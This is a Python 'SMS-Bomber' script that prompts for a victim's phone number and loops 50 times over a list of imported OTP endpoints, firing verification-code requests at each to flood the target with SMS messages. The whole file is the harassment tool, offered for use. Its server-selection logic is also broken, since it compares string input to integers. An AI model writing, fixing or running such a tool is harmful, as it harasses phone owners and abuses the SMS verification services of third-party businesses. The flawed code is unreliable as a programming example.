from api import send_otp_requests
import requests #pip install requests
import pyfiglet #pip install requests
from colorama import Fore,init #pip install colorama

init()
print( Fore.RED + "************************************************************")
logo = pyfiglet.figlet_format("SMS-Bomber", font = "slant")
print(logo)
print(Fore.WHITE+"\t \t By : " + Fore.RED + "FARBODxME" + Fore.YELLOW +" & "+Fore.WHITE+"Edit : " + Fore.RED+"Mr-Akhoundi")
print("\t \t \t     V 1.0 - 2024")
print( Fore.WHITE+"SELECT Server SMS-Bomber:" + '\n' + Fore.RED + "--> 1" + Fore.YELLOW + " Server One" + '\n' + Fore.RED + "--> 2" + Fore.YELLOW + " Server Two" )

# Receive phone number input from the user
try:

    servers = input(Fore.GREEN+"Enter Number ------> ")
    if(servers==1):
        number = input(Fore.GREEN+"Enter Number Phone (Exm : 901*******) ------> ")
    # Get APIs from api.py
        apis = send_otp_requests(number)

    # Loop to send OTPs 50 times
        for _ in range(50):
            for url, payload, in apis:
                try:
                    response = requests.post(url, data=payload)
                
                    if response.status_code == 200:
                        print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
                    
                except requests.exceptions.RequestException:
                    pass
    if(servers==2):
        # Get APIs from api.py
        number = input(Fore.GREEN+"Enter Number Phone (Exm : 901*******) ------> ")
        apis2 = send_otp_requests(number)
        for _ in range(50):
            for url2, payload2, in apis2:
                try:
                    response2 = requests.post(url2, json=payload2)
                    if response2.status_code == 200:
                        print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url2 +')' +  '.' )
                
                except requests.exceptions.RequestException:
                    pass
                
except KeyboardInterrupt:
    print("\nGoodbye!")
